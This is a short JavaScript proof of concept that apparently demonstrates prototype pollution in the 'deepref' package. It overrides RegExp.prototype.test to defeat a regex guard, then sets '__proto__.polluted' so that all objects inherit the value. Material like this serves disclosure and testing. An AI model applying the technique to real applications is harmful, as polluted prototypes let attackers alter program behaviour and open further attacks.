RegExp.prototype.test = () => false;
console.log({}.polluted);
const deepref = require('deepref');
deepref.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);